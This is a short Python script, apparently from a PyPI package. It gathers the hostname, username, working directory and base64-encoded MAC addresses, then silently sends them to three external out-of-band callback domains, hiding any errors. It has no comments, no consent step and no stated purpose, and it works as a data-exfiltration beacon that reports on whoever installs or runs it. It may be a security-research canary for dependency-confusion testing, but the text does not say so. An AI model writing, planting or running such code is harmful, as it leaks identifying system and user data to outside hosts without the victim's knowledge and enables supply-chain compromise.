import platform
import getpass
import os
import urllib.parse
import urllib.request
import random
import subprocess
import base64

def get_mac_addresses():
    mac_addresses = []
    system = platform.system()

    if system == "Windows":
        output = subprocess.check_output("getmac", shell=True).decode()
        for line in output.splitlines():
            if "Physical" in line:
                mac = line.split()[0]
                mac_addresses.append(mac)

    elif system == "Linux":
        output = subprocess.check_output("ifconfig", shell=True).decode()
        for line in output.splitlines():
            if "ether" in line:
                mac = line.split()[1]
                mac_addresses.append(mac)

    elif system == "Darwin":
        output = subprocess.check_output("ifconfig", shell=True).decode()
        for line in output.splitlines():
            if "ether" in line:
                mac = line.split()[1]
                mac_addresses.append(mac)

    return mac_addresses

def main():
    hostname = platform.node()
    username = getpass.getuser()
    current_path = os.getcwd()
    rd_num = random.randint(10000, 99999)
    mac_addresses = get_mac_addresses()
    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')

    urls = [
        "http://dnipqouebm-psl.cn.oast-cn.byted-dast.com",
        "http://oqvignkp58-psl.i18n.oast-row.byted-dast.com",
        "http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun"
    ]

    for url in urls:
        params = {
            "hostname": hostname,
            "username": username,
            "dir": current_path,
            "mac_address": bs64_encode_mac
        }
        full_url = f"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}"
        try:
            with urllib.request.urlopen(full_url) as response:
                pass
        except Exception as e:
            pass


if __name__ == "__main__":
    main()